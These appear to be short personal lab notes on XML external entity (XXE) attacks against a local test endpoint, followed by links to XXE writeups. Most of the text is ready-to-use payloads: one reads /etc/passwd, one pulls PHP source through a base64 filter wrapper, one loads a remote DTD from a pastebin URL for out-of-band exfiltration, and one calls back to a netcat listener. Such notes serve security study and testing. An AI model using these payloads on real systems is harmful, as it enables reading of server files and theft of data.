
POST -> http://127.0.0.1:8802/xxe.php

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <userInfo>
  <user>&xxe;</user>
 </userInfo>


<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <userInfo>
  <user>&xxe;</user>
 </userInfo>


<?xml version="1.0" ?>
<!DOCTYPE user [
<!ELEMENT user ANY >
<!ENTITY % sp SYSTEM "https://pastebin.com/raw/cNMvFSG8">
%sp;
%param1;
]>
<user>&exfil;</user>
// - check docker-compose logs


//change 127.0.0.1 - to local ip (not 127.0.0.1)
nc -l -p 7777
<?xml version="1.0"?>
<!DOCTYPE name [<!ENTITY xxe SYSTEM "http://192.168.96.1:7777" >]>
<name>&xxe;</name>




https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi
https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0
https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
